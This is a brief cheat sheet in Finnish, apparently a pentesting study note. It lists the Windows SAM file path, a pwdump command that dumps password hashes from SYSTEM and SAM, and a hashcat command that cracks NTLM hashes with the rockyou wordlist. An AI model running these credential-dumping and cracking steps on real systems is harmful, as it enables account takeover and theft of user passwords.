 /Windows/System32/config/SAM			<--->	Salasana tiedosto windowsille
 pwdump SYSTEM SAM > /kansio/.txt		<--->	Dumpaa salasa hashit luottavaan muotoon
 hashcat -v -m 1000 windowshash rockyou.txt	<--->	SAM hash crackaus
